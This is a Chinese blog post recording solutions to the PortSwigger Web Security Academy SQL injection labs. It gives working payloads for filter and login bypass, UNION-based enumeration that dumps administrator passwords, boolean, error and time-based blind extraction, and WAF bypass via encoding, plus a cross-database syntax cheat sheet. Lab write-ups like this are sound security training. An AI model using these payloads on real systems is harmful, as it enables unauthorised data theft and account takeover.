+++
title = "PortSwigger SQL 注入 Labs 通关笔记"
date = 2026-11-05T06:30:00+08:00
draft = false
tags = ["SQL注入", "PortSwigger", "Web安全"]
categories = ["渗透测试"]
summary = "PortSwigger Web Security Academy SQL 注入 17 个实验的通关记录：UNION、盲注、带外与 WAF 绕过。"
ShowToc = true
TocOpen = false
+++
> 环境：Burp Suite Community Edition · 靶场：PortSwigger Web Security Academy ｜ 时间：2026-11 ｜ 进度：17 题完成 15 题（2 题需 Burp Pro）

## 写在前面

这是「PortSwigger 通关」系列的第一篇。SQL 注入的实验从最基础的 WHERE 子句开始，覆盖 UNION、盲注（布尔 / 报错 / 时间）、带外和 WAF 绕过。笔记按实验顺序整理，每题记录目标、关键 payload 和踩坑点，方便复习时快速定位。

## 实验清单

| # | 实验 | 状态 |
|---|------|------|
| 1 | WHERE 子句注入，检索隐藏数据 | ✅ |
| 2 | 登录绕过 | ✅ |
| 3 | 查询 Oracle 的数据库类型与版本 | ✅ |
| 4 | 查询 MySQL / SQL Server 的数据库类型与版本 | ✅ |
| 5 | 列出非 Oracle 数据库的内容 | ✅ |
| 6 | 列出 Oracle 数据库的内容 | ✅ |
| 7 | UNION 攻击：确定查询列数 | ✅ |
| 8 | UNION 攻击：寻找可回显字符串的列 | ✅ |
| 9 | UNION 攻击：从其他表取数据 | ✅ |
| 10 | UNION 攻击：单列回显多个值 | ✅ |
| 11 | 条件响应盲注 | ✅ |
| 12 | 条件错误盲注 | ✅ |
| 13 | 可见错误回显注入 | ✅ |
| 14 | 时间延迟盲注 | ✅ |
| 15 | 时间延迟盲注 + 数据提取 | ✅ |
| 16 | 带外注入（interaction / exfiltration） | ⏸ 需 Pro |
| 17 | XML 编码绕过 WAF | ✅ |

---

## 1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

![image-20261105000406596](01.png)

题目直接给出了商品分类使用的查询语句。

![image-20261105000737032](02.png)

进入靶场后可以看到多个分类，点击 Accessories 后，跳转地址为：

```
https://0ae600bc044ca55582e0ab2900370064.web-security-academy.net/filter?category=Accessories
```

按题目给出的查询语句，在 `Accessories` 后加上：

```
' or 1=1 -- 
```

拼接后实际执行的语句变成：

```
SELECT * FROM products WHERE category = 'Accessories'or 1=1 -- ' AND released = 1
```

`--` 之后的内容会被当作注释，不再参与解析，条件恒为真，于是所有商品都会被返回。

![image-20261105001400221](03.png)

---

## 2. SQL injection vulnerability allowing login bypass

![image-20261105001920357](04.png)

题目说明登录功能存在注入，要求以 administrator 身份登录。

![image-20261105002435735](05.png)

进入靶场后，右上角比上一题多了一个 My account 入口。

![image-20261105002534424](06.png)

点进去是一个简易登录框，用万能密码尝试登录：

```
administrator' or 1=1 -- 
```

![image-20261105002700570](07.png)

![image-20261105002724193](08.png)

登录成功，靶场判定通关。

---

## 3. SQL injection attack, querying the database type and version on Oracle

![image-20261105002826591](09.png)

题目说明注入点在商品分类参数，要求使用 UNION 攻击，并提示数据库是 Oracle。

![image-20261105003113766](10.png)

页面顶部给出了要回显的内容（Oracle 版本）。在用 UNION 之前，先用 ORDER BY 探测查询列数。

![image-20261105004041334](11.png)

![image-20261105004113814](12.png)

按第 2 列排序正常、按第 3 列报错，说明查询共 2 列。构造 UNION 后成功带出版本信息：

```
' union select null,banner from v$version --
```

![image-20261105004400969](13.png)

---

## 4. SQL injection attack, querying the database type and version on MySQL and Microsoft

![image-20261105004510969](14.png)

与上一题思路相同，只是目标换成了 MySQL 和 Microsoft SQL Server。

![image-20261105004810850](15.png)

步骤完全一致，只需把取版本的语句换成对应数据库的语法（MySQL / SQL Server 用 `@@version`）：

```
' union select null,@@version --
```

---

## 5. SQL injection attack, listing the database contents on non-Oracle databases

![image-20261105005045690](16.png)

漏洞类型与前面相同，但这次要查询其他表的数据，拿到 administrator 的密码。

![image-20261105005352999](17.png)

![image-20261105005422895](18.png)

为了便于查看，这里省略了页面中与注入数据无关的内容。题目排除了 Oracle，用 MySQL / PostgreSQL 的语法试探后，确认后端是 PostgreSQL。先列出所有 schema：

```
' union select null,schema from information_schema.schemata --+
```

![image-20261105010140654](19.png)

`information_schema` 和 `pg_catalog` 都是数据库自带的系统 schema，业务数据在 `public` 里。继续查 `public` 下有哪些表：

```
' union select null,table_name from information_schema.tables where table_schema='public' --+
```

![image-20261105010412004](20.png)

用户数据在 `users_zxwabc` 表中，接着查它的列名：

```
' union select null,column_name from information_schema.columns where table_name='users_zxwabc' --+
```

![image-20261105010636124](21.png)

最后取出用户名和密码：

```
' union select username_znxksg,password_xjsenj from users_zxwabc --+
```

![image-20261105010750407](22.png)

拿到 administrator 的密码后，回登录页登录即可通关。

---

## 6. SQL injection attack, listing the database contents on Oracle

![image-20261105010912460](23.png)

与上一题相同，只是数据库换成了 Oracle。

![image-20261105012521215](24.png)

Oracle 里 schema 就是 owner，除了系统用户，只有 `PETER` 是业务 schema。用它查表：

```
' union select null,table_name from all_tables where owner='PETER' --
```

![image-20261105012637036](25.png)

再查 `USERS_XBDFHG` 的列名：

```
' union select null,column_name from all_tab_columns where table_name='USERS_XBDFHG' --
```

![image-20261105012905097](26.png)

最后取出该表内容，用管理员账号登录即可：

```
' union select PASSWORD_KMJELD,USERNAME_VIBASQ from USERS_XBDFHG --
```

![image-20261105013029794](27.png)

---

## 7. SQL injection UNION attack, determining the number of columns returned by the query

![image-20261105013336260](28.png)

与前面一样，只是要求先确定列数。前面每道题我都先做了 ORDER BY 探测，这里不再重复。

---

## 8. SQL injection UNION attack, finding a column containing text

![image-20261105013532818](29.png)

本题要求找出能回显字符串的列，并把指定字符串带出来。

![image-20261105013735904](30.png)

页面顶部给出了要回显的字符串。用 ORDER BY 测出查询共 3 列，构造 3 个 NULL 的 UNION 后页面正常显示：

```
' union select null,null,null --+
```

![image-20261105013950539](31.png)

依次把 3 个 NULL 换成目标字符串：

![image-20261105014046217](32.png)

![image-20261105014134434](33.png)

第二个位置成功回显，说明第 2 列是字符串类型。

---

## 9. SQL injection UNION attack, retrieving data from other tables

思路与上一题相同，不再赘述。

---

## 10. SQL injection UNION attack, retrieving multiple values in a single column

![image-20261105014555136](34.png)

其余与上一题相同，但本题只有一个回显列。

![image-20261105015430382](35.png)

测试后确认数据库是 PostgreSQL，查询共 2 列、只有第 2 列回显且为字符串。有两种做法：

**做法一**：用 `||` 把用户名和密码拼成一列输出，中间加分隔符便于区分：

```
' union select 1,username||'-'||password from users --
```

![image-20261105015817765](36.png)

**做法二**：先查出用户名，再按用户名查密码。

```
' union select null,username from users --
' union select null,password from users where username='administrator' --
```

![image-20261105015933125](37.png)

![image-20261105020002555](38.png)

拿到用户名和密码后登录即可。

---

## 11. Blind SQL injection with conditional responses

![image-20261105020142640](39.png)

题目说明注入点在 Cookie 中：查询命中时，页面会显示 Welcome back。

![image-20261105020406855](40.png)

进入靶场后，任意商品页右上角都会显示 Welcome back。

![image-20261105020558808](41.png)

用 Burp 抓包可以看到请求里带了：`Cookie: TrackingId=iAzNc4W7chWdqc7H;`

![image-20261105020726291](42.png)

![image-20261105020751957](43.png)

![image-20261105020815933](44.png)

![image-20261105020900583](45.png)

把请求发到 Repeater 测试后确认是 PostgreSQL，查询里有一列字符串类型的数据。页面不回显查询结果，UNION 用不上，改用布尔条件拼接：

![image-20261105021234520](46.png)

![image-20261105021253971](47.png)

`AND` 后的条件为真时显示 Welcome back，为假时不显示，据此可以逐位推断内容。

![image-20261105022721772](48.png)

多次试探后确定 administrator 的密码是 20 位。提示说明密码只含数字和小写字母，用二分法可以加速，但这里先用最直接的办法：把请求发到 Intruder，payload 改成对 20 个下划线的 `LIKE` 匹配：

```
' and (select count((select password from users where username='administrator' and password like '____________________')))=1--
```

把 20 个下划线都标成 payload position，用 Sniper 模式，字典放 0-9 和 a-z。

![image-20261105023753435](49.png)

然后开始爆破。

爆破耗时较长；靶场长时间无通信会被销毁，而密码是随机生成的，重新进入后需要重新提取。

![image-20261105045357534](50.png)

按响应长度排序，再按位置拼接 payload，得到密码 `m52hcj27kwjtdu2997b3`：

![image-20261105045546472](51.png)

---

## 12. Blind SQL injection with conditional errors

![image-20261105045654601](52.png)

注入点同上，仍在 Cookie 里；本题的差异是会返回错误信息。

![image-20261105050924920](53.png)

![image-20261105050905512](54.png)

发到 Repeater 测试：条件不成立时 SQL 报错、页面返回 500；成立时正常返回 200，且数据库为 Oracle。

![image-20261105052715292](55.png)

![image-20261105052402898](56.png)

构造 `CASE WHEN 条件 THEN TO_CHAR(1/0) ELSE NULL END`：条件为真时触发除零错误，为假时页面正常，据此可逐位判断密码：

```
' union (select case when 条件 then to_char(1/0) else null end from dual)--
```

![image-20261105053246281](57.png)

![image-20261105053306999](58.png)

![image-20261105053503861](59.png)

![image-20261105053519434](60.png)

简单测试后确定密码为 20 位、首位是 `d`，其余步骤同上一题，不再赘述。

---

## 13. Visible error-based SQL injection

![image-20261105054019894](61.png)

题目说明注入点在 Cookie。

![image-20261105054342300](62.png)

测试发现本题会把数据库错误回显到页面；后台查询是 `SELECT * FROM tracking WHERE id = 'TrackingId'`，TrackingId 就是 Cookie 的值。

![image-20261105055029708](63.png)

用各数据库的特征语法探测，确认是 PostgreSQL。

![image-20261105055315742](64.png)

拼接语句时报错，从报错看后台对字符串长度有限制，需要更短的写法。

![image-20261105055705446](65.png)

把字符串强制转成 int 触发类型错误，就能让错误信息把内容带出来。

![image-20261105060052614](66.png)

![image-20261105060147837](67.png)

第一条就是 administrator，密码 `z3yxrrsuqvw7l5gounvi`。

---

## 14. Blind SQL injection with time delays

![image-20261105053813644](68.png)

注入点仍在 Cookie，但页面没有任何回显，只能用时间盲注；题目要求触发 10 秒延迟。

![image-20261105060520873](69.png)

用 `pg_sleep(10)` 后，右下角的响应时间比平时多出约 10 秒，验证成功。

---

## 15. Blind SQL injection with time delays and information retrieval

![image-20261105060749558](70.png)

本题要求用时间盲注把密码取出来。

![image-20261105061002116](71.png)

靶场与上一题完全一样，直接构造时间盲注 payload：

```
' and (select case when 条件 then pg_sleep(3) else null end) is null --+
```

![image-20261105061139571](72.png)

![image-20261105061155138](73.png)

条件为真时响应约 3.267 秒、为假时约 0.258 秒，差异明显。结合第 11 题的按位爆破即可拿到密码，不再赘述。

---

## 16. Blind SQL injection with out-of-band interaction / data exfiltration

这两题是 DNS 带外（OAST）。靶场屏蔽了第三方 DNSLog 平台，官方要求使用 Burp Collaborator（Pro 功能），我这里是社区版，暂不演示。

---

## 17. SQL injection with filter bypass via XML encoding

![image-20261105061951200](74.png)

本题要求在 WAF 拦截下完成注入。

![image-20261105062158849](75.png)

按题目提示找到注入点。

![image-20261105062256194](76.png)

简单尝试就被 WAF 拦了，需要绕过。

![image-20261105062411639](77.png)

从 BApp Store 安装 Hackvertor，用它对 payload 编码。

![image-20261105062745917](78.png)

把 payload 放进 Hackvertor，用 `dec_entities` 编码后拿去打。

![image-20261105062933385](79.png)

拿到了 users 表的列名。

![image-20261105063031495](80.png)

![image-20261105063044499](81.png)

按列名写出查询 payload，同样编码后发送，即可拿到用户名和密码。

---

## 附：各数据库关键语法对照

| 用途 | MySQL | PostgreSQL | Oracle | SQL Server |
|------|-------|------------|--------|------------|
| 版本 | `@@version` | `version()` | `SELECT banner FROM v$version` | `@@version` |
| 列出表 | `information_schema.tables` | 同左 | `all_tables` | `information_schema.tables` |
| 列出列 | `information_schema.columns` | 同左 | `all_tab_columns` | 同左 |
| 字符串拼接 | `CONCAT(a,b)` | `a\|\|b` | `a\|\|b` | `a+b` |
| 注释 | `#` / `-- ` | `-- ` | `-- ` | `-- ` |
| 时间延迟 | `SLEEP(5)` | `pg_sleep(5)` | `dbms_pipe.receive_message(('a'),5)` | `WAITFOR DELAY '0:0:5'` |
